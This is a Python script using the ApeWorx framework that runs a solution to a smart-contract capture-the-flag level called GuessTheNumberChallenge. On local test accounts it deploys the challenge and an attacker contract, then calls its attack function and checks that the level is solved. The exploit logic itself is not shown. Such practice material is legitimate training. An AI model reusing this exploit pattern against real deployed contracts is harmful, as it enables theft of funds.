from ape import accounts, project


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # get accounts
    deployer = accounts.test_accounts[0]
    attacker = accounts.test_accounts[1]

    # deploy challenge contract
    print("\n--- Deploying Challenge ---\n")
    challenge = project.GuessTheNumberChallenge.deploy(sender=deployer)

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    attacker_contract = project.GuessTheNumberAttacker.deploy(
        challenge.address, sender=attacker
    )
    attacker_contract.attack(sender=attacker)

    # --- AFTER EXPLOIT --- #

    assert challenge.isSolved()

    print("\n--- 🥂 Challenge Completed! 🥂 ---\n")


if __name__ == "__main__":
    main()
